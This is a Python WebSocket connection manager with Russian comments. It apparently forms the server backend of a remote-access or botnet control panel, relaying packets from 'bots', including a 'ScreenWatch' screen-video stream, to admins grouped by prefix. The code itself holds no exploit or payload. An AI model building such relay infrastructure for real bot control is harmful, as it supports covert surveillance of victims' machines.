# backend/API/connection_manager.py

import asyncio
from logs import Log as logger

class ConnectionManager:
    """Управление очередями отправки и туннелями доступа пользователей"""

    def __init__(self):
        self.active_connections = {}  # {login: [ws]}
        self.tunnels = {}            # {prefix: [ws]}
        self.queues = {}             # {ws: Queue}
        self.send_tasks = {}         # {ws: Task}
        self.bot_prefix_cache = {}    # {raw_id: prefix_str}

    async def connect(self, ws, login, user):
        """Регистрация нового WebSocket и запуск воркера отправки"""
        await ws.accept()
        queue = asyncio.Queue(maxsize=100)
        self.queues[ws] = queue
        self.send_tasks[ws] = asyncio.create_task(self._socket_writer(ws, queue))
        
        self.active_connections.setdefault(login, []).append(ws)
        prefix = user.get("prefix", "NONE")
        
        self.tunnels.setdefault(prefix, []).append(ws)
        if user.get("role") == "admin":
            self.tunnels.setdefault("ALL", []).append(ws)
            
        logger.info(f"[API] [+] {login} вошел в туннель {prefix}")

    def broadcast_packet_sync(self, packet: bytes):
        """Синхронная рассылка пакета всем заинтересованным админам"""
        if len(packet) < 6: return
        
        id_len, mod_len = packet[0], packet[1]
        raw_id = packet[6:6 + id_len]
        
        # Определение типа трафика (видео требует real-time)
        module_bytes = packet[6 + id_len : 6 + id_len + mod_len]
        is_video = b"ScreenWatch" in module_bytes

        # Получаем префикс бота (из кэша или расчетом)
        prefix = self._get_bot_prefix(raw_id)
        
        # Собираем список получателей (свой префикс + глобальные админы)
        targets = set(self.tunnels.get(prefix, [])) | set(self.tunnels.get("ALL", []))

        for ws in targets:
            q = self.queues.get(ws)
            if not q: continue
            
            if is_video and q.full():
                self._clear_queue(q)
            
            try:
                q.put_nowait(packet)
            except asyncio.QueueFull:
                pass

    async def _socket_writer(self, ws, queue):
        """Изолированный цикл отправки, чтобы медленный интернет админа не вешал сервер"""
        try:
            while True:
                packet = await queue.get()
                await ws.send_bytes(packet)
                queue.task_done()
        except Exception: pass
        finally:
            logger.debug("[API] Writer closed")

    def disconnect(self, ws, login):
        """Полная очистка всех ссылок на закрытый сокет"""
        if ws in self.send_tasks:
            self.send_tasks[ws].cancel()
            del self.send_tasks[ws]
        
        self.queues.pop(ws, None)
        for group in self.active_connections.values():
            if ws in group: group.remove(ws)
        for group in self.tunnels.values():
            if ws in group: group.remove(ws)

    def _get_bot_prefix(self, raw_id):
        """Быстрое получение префикса из ID бота"""
        if raw_id in self.bot_prefix_cache:
            return self.bot_prefix_cache[raw_id]
        
        try:
            bid_str = raw_id.decode(errors='ignore')
            prefix = bid_str.split('-')[0] if '-' in bid_str else "NONE"
            if len(self.bot_prefix_cache) > 1000: self.bot_prefix_cache.clear()
            self.bot_prefix_cache[raw_id] = prefix
            return prefix
        except: return "NONE"

    def _clear_queue(self, q):
        """Дроп старых кадров видео для поддержания актуальности стрима"""
        while q.full():
            try: q.get_nowait()
            except asyncio.QueueEmpty: break